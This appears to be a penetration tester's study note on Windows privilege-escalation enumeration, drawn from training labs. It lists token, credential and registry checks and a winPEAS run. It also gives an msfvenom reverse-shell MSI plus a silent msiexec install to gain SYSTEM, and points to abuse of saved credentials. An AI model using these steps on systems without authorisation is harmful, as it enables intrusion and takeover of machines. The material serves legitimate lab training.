---
tags: [privesc, enum]
tools: [winpeas]
ports: []
os: [windows]
phase: [privesc]
---
# Privesc - Windows enumeration

**TL;DR:** Run winPEAS for the full sweep, but check the quick wins by hand first: `whoami /priv` (token privileges), `cmdkey /list` (stored creds), and the AlwaysInstallElevated registry keys. These three are fast and often decisive.

from: TryHackMe Windows PrivEsc / PrivEsc Arena — verified vs common Windows LPE references

## Quick manual checks (do these first)

```cmd
whoami /priv                 :: SeImpersonate/SeAssignPrimaryToken -> potato (see token note)
whoami /groups
cmdkey /list                 :: saved creds -> runas /savecred
systeminfo                   :: OS build -> searchsploit for kernel exploits

:: AlwaysInstallElevated (both must = 0x1): any MSI installs as SYSTEM
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If AlwaysInstallElevated is set: `msfvenom -p windows/x64/shell_reverse_tcp ... -f msi -o eva.msi` then `msiexec /quiet /qn /i eva.msi`.

## Full sweep

```cmd
winpeas.exe > out.txt      :: or winPEASany.exe; read the red/yellow highlights
```

## Related

- [[Privesc - Windows services]], [[Privesc - Windows token impersonation]]
- [[Tool - winpeas]]
- winPEAS source: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
